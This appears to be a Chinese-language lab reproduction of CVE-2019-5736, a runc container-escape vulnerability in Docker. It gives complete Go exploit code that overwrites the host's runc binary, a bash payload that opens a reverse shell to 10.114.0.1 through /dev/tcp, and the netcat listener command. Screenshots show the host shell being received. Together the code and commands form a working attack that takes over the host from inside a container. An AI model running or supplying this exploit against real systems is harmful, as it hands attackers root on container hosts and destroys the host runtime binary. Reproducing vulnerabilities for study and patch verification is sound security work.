# CVE-2019-5736 复现

---

## 环境

* Linux: Ubuntu 18.04
* Docker: 18.09.1
* containerd: 1.2.0-1

---

## 步骤

**注：该漏洞会覆写runc程序，需要提前做备份。**

创建一个容器，在里面创建payload文件（[exp.sh](exp.sh)）：

```shell
#!/bin/bash
/bin/bash -i >& /dev/tcp/10.114.0.1/1234 0>&1
```

在10.114.0.1中开启监听：

```shell
nc -lvp 1234
```

然后在容器中创建并编译exp（[exp.go](exp.go)），其中“/exp.sh”为上面创建的payload文件：

```go
package main

import (
    "io/ioutil"
    "os"
    "strconv"
    "bytes"
)

func main() {
    payload, _ := ioutil.ReadFile("/exp.sh")
    ioutil.WriteFile("/bin/sh", []byte("#!/proc/self/exe"), 0755)

    pid := ""
    for pid == "" {
        pids, _ := ioutil.ReadDir("/proc")

        for _, f := range pids {
            cmdline, _ := ioutil.ReadFile("/proc/" + f.Name() + "/cmdline")
            if bytes.Contains(cmdline, []byte("runc")) {
                pid = f.Name()
                break
            }
        }
    }

    exefd := ""
    for {
        exe, _ := os.Open("/proc/"+pid+"/exe")
        if int(exe.Fd()) > 0 {
            exefd = strconv.Itoa(int(exe.Fd()))
            break
        }
    }

    for {
        writefd, _ := os.OpenFile("/proc/self/fd/"+exefd, os.O_WRONLY|os.O_TRUNC, 0755)
        if int(writefd.Fd()) > 0 {
            writefd.Write(payload)
            break
        }
    }
}

```

在容器中执行该程序，然后在另一个宿主的session中执行容器的/bin/sh：

```shell
sudo docker exec -it ubuntu /bin/sh
```

![](img/5736_exec_sh.png)

由于此时容器中的/bin/sh已经被覆写，此处实际上运行的是runc本身。随后之前运行的exp覆写runc文件，内容为payload的内容，此时宿主会反弹一个shell到攻击机。

![](img/5736_shell_rev.png)

并且也可以看到runc文件的内容发生了变化。

![](img/5736_cat_runc.png)